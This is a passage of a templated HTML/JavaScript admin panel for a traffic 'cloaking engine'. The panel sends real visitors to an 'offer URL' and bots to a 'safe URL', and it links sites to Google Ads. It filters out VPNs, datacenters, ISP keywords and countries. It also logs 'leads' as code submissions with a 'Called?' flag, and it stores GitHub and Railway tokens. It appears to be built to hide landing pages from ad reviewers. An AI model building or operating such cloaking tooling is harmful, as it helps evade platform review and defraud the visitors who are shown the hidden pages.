body{font-family:system-ui,-apple-system,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);display:flex;min-height:100vh;font-size:14px;}
a{text-decoration:none;color:inherit;}
button{cursor:pointer;font-family:inherit;}
input,select,textarea{font-family:inherit;}

/* SIDEBAR */
#sidebar{width:var(--sidebar-w);background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;top:0;left:0;height:100vh;z-index:100;transition:width 0.2s;}
#sidebar.collapsed{width:56px;}
.sb-logo{display:flex;align-items:center;gap:10px;padding:16px;border-bottom:1px solid var(--border);min-height:60px;}
.sb-logo-icon{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:16px;flex-shrink:0;}
.sb-logo-text{overflow:hidden;white-space:nowrap;}
.sb-logo-text h2{font-size:0.95rem;font-weight:800;color:var(--text);}
.sb-logo-text p{font-size:0.7rem;color:var(--text3);}
.sb-nav{flex:1;padding:10px 0;overflow-y:auto;}
.sb-link{display:flex;align-items:center;gap:10px;padding:10px 14px;color:var(--text2);border-left:3px solid transparent;transition:all 0.15s;cursor:pointer;white-space:nowrap;overflow:hidden;}
.sb-link:hover{background:var(--pri-l);color:var(--pri);}
.sb-link.active{border-left-color:var(--pri);background:var(--pri-l);color:var(--pri);font-weight:600;}
.sb-link .ico{width:18px;text-align:center;flex-shrink:0;font-size:16px;}
.sb-link .lbl{overflow:hidden;}
.sb-badge{background:var(--red);color:#fff;border-radius:10px;padding:1px 6px;font-size:10px;font-weight:700;margin-left:auto;}
.sb-footer{padding:12px;border-top:1px solid var(--border);}
.sb-site-sel{width:100%;padding:7px 10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);font-size:0.82rem;}
.sb-collapse{display:flex;align-items:center;gap:8px;padding:10px 14px;color:var(--text3);cursor:pointer;font-size:0.82rem;border-top:1px solid var(--border);}

/* MAIN */
#main{margin-left:var(--sidebar-w);flex:1;display:flex;flex-direction:column;transition:margin-left 0.2s;min-width:0;}
#sidebar.collapsed ~ #main{margin-left:56px;}

/* TOPBAR */
#topbar{position:sticky;top:0;z-index:50;background:var(--topbar);border-bottom:1px solid var(--border);padding:0 24px;height:60px;display:flex;align-items:center;gap:12px;}
#topbar h1{font-size:1.05rem;font-weight:700;flex:1;}
.tb-clock{font-size:0.82rem;color:var(--text3);font-variant-numeric:tabular-nums;}
.tb-btn{width:34px;height:34px;border:1px solid var(--border);border-radius:8px;background:var(--card);display:flex;align-items:center;justify-content:center;color:var(--text2);transition:all 0.2s;}
.tb-btn:hover{border-color:var(--pri);color:var(--pri);}
.avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#3b82f6,#1d4ed8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:13px;}

/* CONTENT */
#content{padding:24px;flex:1;}
.section{display:none;}
.section.active{display:block;}

/* KPI CARDS */
.kpi-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;margin-bottom:24px;}
.kpi-card{background:var(--card);border-radius:12px;padding:20px;border:1px solid var(--border);position:relative;overflow:hidden;}
.kpi-label{font-size:0.78rem;color:var(--text3);font-weight:500;margin-bottom:8px;}
.kpi-value{font-size:2rem;font-weight:800;letter-spacing:-1px;}
.kpi-icon{position:absolute;top:16px;right:16px;width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;}
.kpi-icon.blue{background:#eff6ff;color:#3b82f6;}
.kpi-icon.green{background:#f0fdf4;color:#22c55e;}
.kpi-icon.red{background:#fef2f2;color:#ef4444;}
.kpi-icon.orange{background:#fff7ed;color:#f97316;}
.kpi-icon.purple{background:#faf5ff;color:#a855f7;}
html.dark .kpi-icon.blue{background:#1e3a5f;}
html.dark .kpi-icon.green{background:#14532d;}
html.dark .kpi-icon.red{background:#450a0a;}
html.dark .kpi-icon.orange{background:#431407;}
html.dark .kpi-icon.purple{background:#3b0764;}

/* CHARTS ROW */
.charts-row{display:grid;grid-template-columns:260px 1fr;gap:16px;margin-bottom:24px;}
.chart-card{background:var(--card);border-radius:12px;padding:20px;border:1px solid var(--border);}
.chart-card h3{font-size:0.88rem;font-weight:600;margin-bottom:16px;color:var(--text2);}

/* TABLE */
.tbl-card{background:var(--card);border-radius:12px;border:1px solid var(--border);overflow:hidden;margin-bottom:20px;}
.tbl-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
.tbl-head h3{font-size:0.92rem;font-weight:600;flex:1;}
table{width:100%;border-collapse:collapse;}
th,td{padding:10px 16px;text-align:left;border-bottom:1px solid var(--border);font-size:0.83rem;}
th{font-weight:600;color:var(--text3);background:var(--bg);font-size:0.78rem;text-transform:uppercase;letter-spacing:0.5px;}
tr:last-child td{border-bottom:none;}
tr:hover td{background:var(--pri-l);}
.mono{font-family:monospace;font-size:0.8rem;}

/* BADGES */
.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:20px;font-size:0.75rem;font-weight:600;}
.badge.green{background:#f0fdf4;color:#16a34a;}
.badge.red{background:#fef2f2;color:#dc2626;}
.badge.orange{background:#fff7ed;color:#c2410c;}
.badge.blue{background:#eff6ff;color:#2563eb;}
.badge.gray{background:#f8fafc;color:#64748b;}
.badge.purple{background:#faf5ff;color:#7e22ce;}
html.dark .badge.green{background:#14532d;color:#4ade80;}
html.dark .badge.red{background:#450a0a;color:#f87171;}
html.dark .badge.orange{background:#431407;color:#fb923c;}
html.dark .badge.blue{background:#1e3a5f;color:#60a5fa;}
html.dark .badge.gray{background:#334155;color:#94a3b8;}
html.dark .badge.purple{background:#3b0764;color:#c084fc;}

/* PILL */
.pill{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:20px;font-size:0.75rem;font-weight:600;margin:3px;}

/* BUTTONS */
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border-radius:8px;font-size:0.83rem;font-weight:600;border:none;transition:all 0.15s;}
.btn-primary{background:var(--pri);color:#fff;}
.btn-primary:hover{background:#2563eb;}
.btn-danger{background:#fef2f2;color:#dc2626;border:1px solid #fecaca;}
.btn-danger:hover{background:#fee2e2;}
.btn-ghost{background:transparent;color:var(--text2);border:1px solid var(--border);}
.btn-ghost:hover{background:var(--bg);}
.btn-sm{padding:5px 10px;font-size:0.78rem;}
.btn-xs{padding:3px 8px;font-size:0.72rem;}

/* INPUTS */
.inp{width:100%;padding:9px 12px;border:1.5px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);font-size:0.88rem;transition:border 0.2s;}
.inp:focus{outline:none;border-color:var(--pri);}
.inp-group{display:flex;gap:8px;}

/* TOGGLE */
.toggle{position:relative;display:inline-block;width:42px;height:24px;}
.toggle input{opacity:0;width:0;height:0;}
.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:#cbd5e1;border-radius:24px;transition:0.2s;}
.slider:before{position:absolute;content:"";height:18px;width:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.2s;}
.toggle input:checked+.slider{background:var(--pri);}
.toggle input:checked+.slider:before{transform:translateX(18px);}

/* LIVE FEED */
#live-feed{max-height:320px;overflow-y:auto;}
.feed-item{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--border);font-size:0.8rem;}
.feed-item:last-child{border-bottom:none;}

/* VISITORS DRAWER */
#vis-drawer{position:fixed;top:0;right:-380px;width:380px;height:100vh;background:var(--card);border-left:1px solid var(--border);z-index:200;transition:right 0.3s;overflow-y:auto;padding:20px;}
#vis-drawer.open{right:0;}
#vis-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.3);z-index:199;display:none;}
#vis-overlay.open{display:block;}

/* SITE CARD */
.site-card{background:var(--card);border-radius:12px;border:1px solid var(--border);margin-bottom:16px;overflow:hidden;}
.site-card-head{display:flex;align-items:center;gap:12px;padding:16px 20px;cursor:pointer;}
.site-avatar{width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#3b82f6,#6366f1);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:16px;flex-shrink:0;}
.site-info{flex:1;min-width:0;}
.site-name{font-weight:700;font-size:0.95rem;}
.site-domain{font-size:0.78rem;color:var(--text3);}
.site-body{border-top:1px solid var(--border);padding:0;}
.site-tabs{display:flex;border-bottom:1px solid var(--border);padding:0 20px;}
.site-tab{padding:10px 16px;font-size:0.83rem;font-weight:600;color:var(--text3);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.15s;}
.site-tab.active{color:var(--pri);border-bottom-color:var(--pri);}
.site-tab-content{padding:20px;display:none;}
.site-tab-content.active{display:block;}

/* TABS (settings) */
.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:20px;flex-wrap:wrap;}
.tab{padding:10px 18px;font-size:0.85rem;font-weight:600;color:var(--text3);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.15s;}
.tab.active{color:var(--pri);border-bottom-color:var(--pri);}
.tab-pane{display:none;}
.tab-pane.active{display:block;}

/* FORM */
.form-row{margin-bottom:16px;}
.form-row label{display:block;font-size:0.82rem;font-weight:600;color:var(--text2);margin-bottom:6px;}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
@media(max-width:640px){.form-grid{grid-template-columns:1fr;}.charts-row{grid-template-columns:1fr;}}

/* MODAL */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:300;display:none;align-items:center;justify-content:center;}
.modal-bg.open{display:flex;}
.modal{background:var(--card);border-radius:16px;padding:28px;width:100%;max-width:480px;max-height:90vh;overflow-y:auto;}
.modal h2{font-size:1.05rem;font-weight:700;margin-bottom:20px;}

/* CODE BLOCK */
.code-block{background:#0f172a;color:#e2e8f0;border-radius:10px;padding:16px;font-family:monospace;font-size:0.78rem;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto;}

/* STATUS DOT */
.dot{width:8px;height:8px;border-radius:50%;display:inline-block;}
.dot.green{background:#22c55e;box-shadow:0 0 6px #22c55e;}
.dot.gray{background:#94a3b8;}
.dot.red{background:#ef4444;}
.dot.orange{background:#f97316;}

/* LIVE BADGE */
#live-badge{display:inline-flex;align-items:center;gap:6px;background:var(--pri-l);color:var(--pri);border-radius:20px;padding:4px 12px;font-size:0.8rem;font-weight:600;cursor:pointer;border:1px solid var(--pri);}

/* TOAST */
#toast-container{position:fixed;bottom:24px;right:24px;z-index:1000;display:flex;flex-direction:column;gap:8px;}
.toast{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 18px;font-size:0.85rem;box-shadow:0 4px 16px rgba(0,0,0,0.12);display:flex;align-items:center;gap:8px;animation:slideIn 0.3s ease;}
.toast.success{border-left:4px solid var(--green);}
.toast.error{border-left:4px solid var(--red);}
@keyframes slideIn{from{transform:translateX(100px);opacity:0;}to{transform:translateX(0);opacity:1;}}

/* SEARCH / FILTER ROW */
.filter-row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:16px;}
.filter-row input,.filter-row select{padding:8px 12px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);font-size:0.83rem;}

/* EXPANDED ROW DETAIL */
.row-detail{background:var(--pri-l);border-top:1px solid var(--border);padding:14px 16px;font-size:0.8rem;display:none;}
.row-detail.open{display:block;}
.detail-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;}
.detail-item label{font-weight:600;color:var(--text3);display:block;font-size:0.72rem;text-transform:uppercase;letter-spacing:0.5px;}
.detail-item span{color:var(--text);font-size:0.82rem;}

/* STATUS PAGE */
.status-box{background:var(--card);border-radius:12px;padding:20px;border:1px solid var(--border);display:flex;align-items:center;gap:16px;margin-bottom:20px;}
.status-box.enabled{border-left:4px solid var(--green);}
.status-box.disabled{border-left:4px solid var(--red);}

/* PAGINATION */
.pagination{display:flex;gap:6px;align-items:center;margin-top:12px;}
.page-btn{padding:5px 10px;border:1px solid var(--border);border-radius:6px;background:var(--card);color:var(--text2);font-size:0.8rem;cursor:pointer;}
.page-btn.active{background:var(--pri);color:#fff;border-color:var(--pri);}
.page-btn:hover:not(.active){background:var(--bg);}

/* TIME RANGE */
.time-tabs{display:flex;gap:6px;margin-bottom:20px;}
.time-tab{padding:6px 14px;border:1px solid var(--border);border-radius:8px;background:var(--card);font-size:0.8rem;cursor:pointer;color:var(--text2);}
.time-tab.active{background:var(--pri);color:#fff;border-color:var(--pri);}

/* SECTION TITLES */
.section-hd{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
.section-hd h2{font-size:1.1rem;font-weight:700;flex:1;}

/* REASON PILLS */
.reasons-row{display:flex;flex-wrap:wrap;gap:6px;padding:16px 20px;}

/* ISP KEYWORD TEXTAREA */
textarea.inp{min-height:100px;resize:vertical;}
</style>
</head>
<body>

<!-- SIDEBAR -->
<nav id="sidebar">
  <div class="sb-logo">
    <div class="sb-logo-icon">F</div>
    <div class="sb-logo-text"><h2>FILTER</h2><p>Traffic Management</p></div>
  </div>
  <div class="sb-nav">
    <a class="sb-link active" data-sec="dashboard" onclick="goSec('dashboard')">
      <span class="ico">📊</span><span class="lbl">Dashboard</span>
    </a>
    <a class="sb-link" data-sec="sites" onclick="goSec('sites')">
      <span class="ico">🌐</span><span class="lbl">Sites</span>
      <span class="sb-badge" id="sites-count">${escHtml(String(sites.length))}</span>
    </a>
    <a class="sb-link" data-sec="logs" onclick="goSec('logs')">
      <span class="ico">📋</span><span class="lbl">Click Log</span>
    </a>
    <a class="sb-link" data-sec="leads" onclick="goSec('leads')">
      <span class="ico">🎯</span><span class="lbl">Leads</span>
    </a>
    <a class="sb-link" data-sec="blocked" onclick="goSec('blocked')">
      <span class="ico">🚫</span><span class="lbl">Blocked IPs</span>
    </a>
    <a class="sb-link" data-sec="settings" onclick="goSec('settings')">
      <span class="ico">⚙️</span><span class="lbl">Settings</span>
    </a>
  </div>
  <div class="sb-footer">
    <div style="margin-bottom:8px;">
      <select class="sb-site-sel" id="globalSiteSel" onchange="globalSiteFilter=this.value;refreshCurrentSection()">
        <option value="all">All Sites</option>
        ${sites.map(s => `<option value="${escHtml(s.id)}">${escHtml(s.name)}</option>`).join('')}
      </select>
    </div>
    <div class="sb-collapse" onclick="toggleSidebar()">⟨ <span id="collapse-lbl">Collapse</span></div>
    <a href="/${escHtml(adminPath)}/logout" class="sb-link" style="color:var(--red)">
      <span class="ico">🚪</span><span class="lbl">Log Out</span>
    </a>
  </div>
</nav>

<!-- MAIN -->
<div id="main">
  <!-- TOPBAR -->
  <div id="topbar">
    <h1 id="page-title">Dashboard</h1>
    <span class="tb-clock" id="clock"></span>
    <button class="tb-btn" onclick="toggleDark()" title="Toggle dark mode">🌙</button>
    <div class="avatar">A</div>
  </div>

  <!-- CONTENT -->
  <div id="content">

    <!-- ── DASHBOARD ── -->
    <div class="section active" id="sec-dashboard">
      <!-- Status box -->
      <div class="status-box" id="cloak-status-box" style="margin-bottom:16px;">
        <span class="dot" id="cloak-dot"></span>
        <div style="flex:1;">
          <div style="font-weight:700;" id="cloak-status-lbl"></div>
          <div style="font-size:0.78rem;color:var(--text3);">Cloaking engine</div>
        </div>
        <button class="btn btn-ghost btn-sm" onclick="toggleCloaking()">Toggle</button>
        <span id="live-badge" onclick="openVisDrawer()">👁 <span id="live-count">0</span> Live</span>
      </div>

      <!-- Time range -->
      <div class="time-tabs" style="flex-wrap:wrap;align-items:center;">
        <button class="time-tab active" onclick="setRange(1,this)">24h</button>
        <button class="time-tab" onclick="setRange(7,this)">7d</button>
        <button class="time-tab" onclick="setRange(30,this)">30d</button>
        <button class="time-tab" onclick="setRange(90,this)">90d</button>
        <button class="time-tab" id="custom-range-btn" onclick="toggleCustomRange(this)">Custom</button>
        <div id="custom-range-inputs" style="display:none;gap:8px;align-items:center;">
          <input type="date" class="inp" id="range-from" style="width:160px;padding:5px 10px;font-size:0.8rem;">
          <span style="color:var(--text3);">to</span>
          <input type="date" class="inp" id="range-to" style="width:160px;padding:5px 10px;font-size:0.8rem;">
          <button class="btn btn-primary btn-sm" onclick="applyCustomRange()">Apply</button>
        </div>
      </div>

      <!-- KPI -->
      <div class="kpi-grid">
        <div class="kpi-card"><div class="kpi-label">Total Visitors</div><div class="kpi-value" id="kpi-total">—</div><div class="kpi-icon blue">👥</div></div>
        <div class="kpi-card"><div class="kpi-label">Allowed</div><div class="kpi-value" id="kpi-allowed">—</div><div class="kpi-icon green">✅</div></div>
        <div class="kpi-card"><div class="kpi-label">Blocked</div><div class="kpi-value" id="kpi-blocked">—</div><div class="kpi-icon red">🚫</div></div>
        <div class="kpi-card"><div class="kpi-label">Block Rate</div><div class="kpi-value" id="kpi-rate">—</div><div class="kpi-icon orange">📈</div></div>
        <div class="kpi-card"><div class="kpi-label">Leads</div><div class="kpi-value" id="kpi-leads">—</div><div class="kpi-icon purple">🎯</div></div>
      </div>

      <!-- Charts row -->
      <div class="charts-row">
        <div class="chart-card">
          <h3>Allow / Block Split</h3>
          <canvas id="donut-chart" width="200" height="200" style="max-width:200px;margin:0 auto;display:block;"></canvas>
          <div style="text-align:center;margin-top:10px;font-size:0.8rem;color:var(--text3);" id="donut-legend"></div>
        </div>
        <div class="chart-card" style="overflow:hidden;">
          <h3>Traffic by Hour</h3>
          <canvas id="bar-chart" style="width:100%;max-height:200px;"></canvas>
        </div>
      </div>

      <!-- Block reasons & top countries -->
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px;">
        <div class="tbl-card">
          <div class="tbl-head"><h3>Block Reasons</h3></div>
          <div class="reasons-row" id="reasons-row"></div>
        </div>
        <div class="tbl-card">
          <div class="tbl-head"><h3>Top Countries</h3></div>
          <table><thead><tr><th>Country</th><th>Hits</th><th>Blocked</th><th>Rate</th></tr></thead>
          <tbody id="countries-tbody"></tbody></table>
        </div>
      </div>

      <!-- Live feed -->
      <div class="tbl-card">
        <div class="tbl-head"><h3>Live Feed</h3><span class="badge blue" id="feed-badge">0 today</span></div>
        <div id="live-feed"></div>
      </div>
    </div>

    <!-- ── SITES ── -->
    <div class="section" id="sec-sites">
      <div class="section-hd">
        <h2>Connected Sites</h2>
        <span class="badge blue" id="sites-badge">${escHtml(String(sites.length))} sites</span>
        <button class="btn btn-primary btn-sm" onclick="openAddSite()">+ Add Site</button>
      </div>
      <div id="sites-list"></div>
    </div>

    <!-- ── CLICK LOG ── -->
    <div class="section" id="sec-logs">
      <div class="section-hd">
        <h2>Click Log</h2>
        <button class="btn btn-danger btn-sm" onclick="clearLogs()">Clear Log</button>
      </div>
      <div class="filter-row">
        <input type="text" class="inp" style="flex:1;min-width:160px;" placeholder="Search IP, ISP, city..." id="log-search" oninput="debounceLoadLogs()">
        <select id="log-decision" onchange="loadLogs(1)"><option value="all">All</option><option value="allow">Allowed</option><option value="block">Blocked</option></select>
        <select id="log-site" onchange="loadLogs(1)"><option value="all">All Sites</option>${sites.map(s=>`<option value="${escHtml(s.id)}">${escHtml(s.name)}</option>`).join('')}</select>
        <select id="log-channel" onchange="loadLogs(1)"><option value="all">All Channels</option>${CHANNELS_META.map(c=>`<option value="${escHtml(c.slug)}">${escHtml(c.name)}</option>`).join('')}</select>
        <input type="date" class="inp" id="log-date" onchange="loadLogs(1)" style="width:160px;">
      </div>
      <div class="tbl-card">
        <div class="tbl-head"><h3>Visitor Decisions</h3><span class="badge gray" id="log-total-badge">—</span></div>
        <div style="overflow-x:auto;">
        <table><thead><tr><th>Time</th><th>Decision</th><th>IP / Page</th><th>Country</th><th>ISP</th><th>Screen</th><th>Reason</th><th></th></tr></thead>
        <tbody id="logs-tbody"></tbody></table>
        </div>
        <div style="padding:12px 16px;border-top:1px solid var(--border);">
          <div class="pagination" id="logs-pagination"></div>
        </div>
      </div>
    </div>

    <!-- ── LEADS ── -->
    <div class="section" id="sec-leads">
      <div class="section-hd">
        <h2>Leads</h2>
        <a href="/${escHtml(adminPath)}/export-leads" class="btn btn-ghost btn-sm">Export CSV</a>
        <button class="btn btn-danger btn-sm" onclick="clearLeads()">Clear Leads</button>
      </div>
      <div class="filter-row">
        <select id="lead-channel" onchange="loadLeads(1)"><option value="all">All Channels</option>${CHANNELS_META.map(c=>`<option value="${escHtml(c.slug)}">${escHtml(c.name)}</option>`).join('')}</select>
      </div>
      <div class="tbl-card">
        <div class="tbl-head"><h3>Code Submissions</h3><span class="badge gray" id="leads-total-badge">—</span></div>
        <div style="overflow-x:auto;">
        <table><thead><tr><th>Time</th><th>IP</th><th>Country</th><th>Code</th><th>UTM Source</th><th>Campaign</th><th>Called?</th><th>Site</th><th></th></tr></thead>
        <tbody id="leads-tbody"></tbody></table>
        </div>
        <div style="padding:12px 16px;border-top:1px solid var(--border);">
          <div class="pagination" id="leads-pagination"></div>
        </div>
      </div>
    </div>

    <!-- ── BLOCKED IPs ── -->
    <div class="section" id="sec-blocked">
      <div class="section-hd"><h2>Blocked IPs</h2></div>
      <div class="tbl-card" style="margin-bottom:16px;">
        <div class="tbl-head">
          <div class="inp-group" style="flex:1;">
            <input type="text" class="inp" id="block-ip-inp" placeholder="IP address to block" style="flex:1;">
            <button class="btn btn-danger btn-sm" onclick="blockIP()">Block IP</button>
          </div>
        </div>
      </div>
      <div class="tbl-card">
        <div class="tbl-head"><h3>Blocked List</h3></div>
        <table><thead><tr><th>IP Address</th><th>Action</th></tr></thead>
        <tbody id="blocked-tbody"></tbody></table>
      </div>
    </div>

    <!-- ── SETTINGS ── -->
    <div class="section" id="sec-settings">
      <div class="section-hd"><h2>Settings</h2></div>
      <div class="tabs">
        <div class="tab active" onclick="setSettingsTab('engine',this)">Engine</div>
        <div class="tab" onclick="setSettingsTab('security',this)">Security</div>
        <div class="tab" onclick="setSettingsTab('countries',this)">Countries</div>
        <div class="tab" onclick="setSettingsTab('integrations',this)">Integrations</div>
        <div class="tab" onclick="setSettingsTab('timezone',this)">Timezone</div>
        <div class="tab" onclick="setSettingsTab('password',this)">Password</div>
        <div class="tab" onclick="setSettingsTab('danger',this)">Danger Zone</div>
      </div>

      <!-- Engine tab -->
      <div class="tab-pane active" id="tab-engine">
        <div class="form-grid">
          <div class="form-row"><label>Default Offer URL (real visitors)</label>
            <input class="inp" id="st-money" value="${escHtml(settings.moneyUrl||'')}"></div>
          <div class="form-row"><label>Default Safe URL (bots)</label>
            <input class="inp" id="st-safe" value="${escHtml(settings.safeUrl||'')}"></div>
        </div>
        <button class="btn btn-primary" onclick="saveEngine()">Save</button>
      </div>

      <!-- Security tab -->
      <div class="tab-pane" id="tab-security">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px;">
          ${[
            ['botBlocking','Bot UA Blocking'],['vpnBlocking','VPN/Proxy Blocking'],
            ['proxyBlocking','Datacenter/Hosting Blocking'],['repeatBlocking','Repeat-Click Blocking'],
            ['ispBlocking','ISP Keyword Blocking'],['countryBlocking','Country Blocking']
          ].map(([k,lbl]) => `<div style="display:flex;align-items:center;justify-content:space-between;padding:12px;background:var(--bg);border-radius:8px;">
            <span style="font-weight:600;font-size:0.88rem;">${lbl}</span>
            <label class="toggle"><input type="checkbox" id="st-${k}" ${settings[k] ? 'checked' : ''}><span class="slider"></span></label>
          </div>`).join('')}
        </div>
        <div class="form-row"><label>Custom Suspicious ISP Keywords (one per line)</label>
          <textarea class="inp" id="st-isp-kw">${escHtml((settings.ispKeywords||[]).join('\n'))}</textarea>
        </div>
        <button class="btn btn-primary" onclick="saveSecurity()">Save</button>
      </div>

      <!-- Countries tab -->
      <div class="tab-pane" id="tab-countries">
        <div class="form-row"><label>Allowed Countries (space-separated 2-letter codes, leave blank to allow all)</label>
          <input class="inp" id="st-countries" value="${escHtml((settings.allowedCountries||[]).join(' '))}">
        </div>
        <button class="btn btn-primary" onclick="saveCountries()">Save</button>
      </div>

      <!-- Integrations tab -->
      <div class="tab-pane" id="tab-integrations">
        <div class="form-row"><label>GitHub Personal Access Token</label>
          <div class="inp-group">
            <input class="inp" type="password" id="st-gh-token" placeholder="ghp_...">
            <button class="btn btn-primary btn-sm" onclick="saveGhToken()">Save</button>
          </div>
        </div>
        <div class="form-row"><label>Railway API Token</label>
          <div class="inp-group">
            <input class="inp" type="password" id="st-rw-token" placeholder="railway_...">
            <button class="btn btn-primary btn-sm" onclick="saveRwToken()">Save</button>
          </div>
        </div>
      </div>

      <!-- Timezone tab -->
      <div class="tab-pane" id="tab-timezone">
        <div class="form-row"><label>Display Timezone</label>
          <select class="inp" id="st-tz" style="max-width:320px;">
            ${['UTC','America/New_York','America/Chicago','America/Denver','America/Los_Angeles','America/Toronto','America/Vancouver','Europe/London','Europe/Paris','Europe/Berlin','Asia/Dubai','Asia/Kolkata','Asia/Tokyo','Asia/Singapore','Australia/Sydney'].map(tz=>`<option value="${tz}" ${(settings.timezone||'UTC')===tz?'selected':''}>${tz}</option>`).join('')}
          </select>
        </div>
        <button class="btn btn-primary" onclick="saveTz()">Save</button>
      </div>

      <!-- Password tab -->
      <div class="tab-pane" id="tab-password">
        <div style="max-width:360px;">
          <div class="form-row"><label>Current Password</label><input class="inp" type="password" id="pw-cur"></div>
          <div class="form-row"><label>New Password</label><input class="inp" type="password" id="pw-new"></div>
          <div class="form-row"><label>Confirm New Password</label><input class="inp" type="password" id="pw-confirm"></div>
          <button class="btn btn-primary" onclick="changePassword()">Change Password</button>
        </div>
      </div>

      <!-- Danger Zone tab -->
      <div class="tab-pane" id="tab-danger">
        <div style="display:flex;flex-direction:column;gap:12px;max-width:400px;">
          <div style="background:#fef2f2;border:1px solid #fecaca;border-radius:10px;padding:16px;">
            <div style="font-weight:700;color:#dc2626;margin-bottom:6px;">Clear All Logs</div>
            <div style="font-size:0.82rem;color:#64748b;margin-bottom:12px;">This permanently deletes all visitor click logs.</div>
            <button class="btn btn-danger btn-sm" onclick="clearLogs()">Clear All Logs</button>
          </div>
          <div style="background:#fef2f2;border:1px solid #fecaca;border-radius:10px;padding:16px;">
            <div style="font-weight:700;color:#dc2626;margin-bottom:6px;">Clear All Leads</div>
            <div style="font-size:0.82rem;color:#64748b;margin-bottom:12px;">This permanently deletes all lead records.</div>
            <button class="btn btn-danger btn-sm" onclick="clearLeads()">Clear All Leads</button>
          </div>
          <div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:10px;padding:16px;">
            <div style="font-weight:700;color:#c2410c;margin-bottom:6px;">Reset Frequency Store</div>
            <div style="font-size:0.82rem;color:#64748b;margin-bottom:12px;">Clears the repeat-click tracker (allows all IPs to visit again).</div>
            <button class="btn btn-ghost btn-sm" onclick="clearFreq()">Reset</button>
          </div>
        </div>
      </div>
    </div>

  </div><!-- /content -->
</div><!-- /main -->

<!-- VISITORS DRAWER -->
<div id="vis-overlay" onclick="closeVisDrawer()"></div>
<div id="vis-drawer">
  <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;">
    <h2 style="flex:1;font-size:1rem;">Live Visitors</h2>
    <button class="btn btn-ghost btn-sm" onclick="closeVisDrawer()">✕</button>
  </div>
  <div id="vis-list"></div>
</div>

<!-- ADD SITE MODAL -->
<div class="modal-bg" id="add-site-modal">
  <div class="modal">
    <h2>Add New Site</h2>
    <div class="form-row"><label>Site Name</label><input class="inp" id="ns-name" placeholder="My Website"></div>
    <div class="form-row"><label>Domain (no protocol)</label><input class="inp" id="ns-domain" placeholder="example.com"></div>
    <div class="form-row"><label>Offer URL (where real visitors go)</label><input class="inp" id="ns-money" placeholder="https://example.com/offer"></div>
    <div class="form-row"><label>Safe URL (where bots go)</label><input class="inp" id="ns-safe" placeholder="https://example.com/safe"></div>
    <div class="form-row"><label>GitHub Repo URL (optional)</label><input class="inp" id="ns-github" placeholder="https://github.com/owner/repo"></div>
    <div class="form-row"><label>Google Ad URL (reference only)</label><input class="inp" id="ns-ad"></div>
    <div style="display:flex;gap:10px;margin-top:8px;">
      <button class="btn btn-primary" onclick="addSite()">Add Site</button>
      <button class="btn btn-ghost" onclick="closeAddSite()">Cancel</button>
    </div>
  </div>
</div>

<!-- TOAST CONTAINER -->
<div id="toast-container"></div>

<script>
const ADMIN_PATH = '${escHtml(adminPath)}';
let _sites = ${sitesJson};
let _settings = ${settingsJson};
let globalSiteFilter = 'all';
let currentRange = 1;
let logPage = 1, leadPage = 1;
let logDebounce = null;

// ── NAV ──
// Sidebar nav.  Each step is null-checked so a missing element on one
// section never silently breaks every subsequent click — the real bug
// behind the original "sidebar buttons stop working" report.
function goSec(sec) {
  const target = document.getElementById('sec-'+sec);
  if (!target) { console.warn('[goSec] no section sec-'+sec); return; }
  document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('.sb-link').forEach(el => el.classList.remove('active'));
  target.classList.add('active');
  const link = document.querySelector('[data-sec="'+sec+'"]');
  if (link) link.classList.add('active');
  const title = document.getElementById('page-title');
  if (title) {
    const titles = {dashboard:'Dashboard',sites:'Sites',logs:'Click Log',leads:'Leads',blocked:'Blocked IPs',settings:'Settings'};
    title.textContent = titles[sec] || sec;
  }
  window.location.hash = sec;
  if (sec==='logs')    loadLogs(1);
  if (sec==='leads')   loadLeads(1);
  if (sec==='sites')   renderSites();
  if (sec==='blocked') renderBlocked();
}
window.addEventListener('hashchange', () => {
  const sec = window.location.hash.slice(1);
  if (sec && document.getElementById('sec-'+sec)) goSec(sec);
});
window.addEventListener('load', () => {
  const h = window.location.hash.slice(1);
  goSec(h && document.getElementById('sec-'+h) ? h : 'dashboard');
  startClock();
  loadStats();
  setupSSE();
  updateCloakStatus();
});
// Surface any uncaught error so we can diagnose quickly instead of staring
// at a frozen sidebar (the previous failure mode before goSec was hardened).
